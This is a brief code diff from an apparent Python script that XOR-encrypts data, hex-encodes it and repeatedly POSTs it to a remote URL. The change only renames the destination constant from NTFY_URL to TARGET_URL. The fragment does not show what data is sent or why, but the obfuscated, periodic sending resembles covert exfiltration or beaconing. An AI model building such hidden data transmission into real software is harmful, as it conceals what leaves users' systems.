@@ -88,7 +88,7 @@ def main():
             obfuscated = xor_crypt(
                 data.encode("utf-8"), firmware_config.ENCRYPTION_KEY
             ).hex()
-            response = requests.post(firmware_config.NTFY_URL, data=obfuscated)
+            response = requests.post(firmware_config.TARGET_URL, data=obfuscated)
             response.raise_for_status()
             time.sleep(10)
 
@@ -110,7 +110,7 @@ def main():
             obfuscated = xor_crypt(
                 data.encode("utf-8"), firmware_config.ENCRYPTION_KEY
             ).hex()
-            response = requests.post(firmware_config.NTFY_URL, data=obfuscated)
+            response = requests.post(firmware_config.TARGET_URL, data=obfuscated)
             response.raise_for_status()
             time.sleep(10)
         except KeyboardInterrupt:
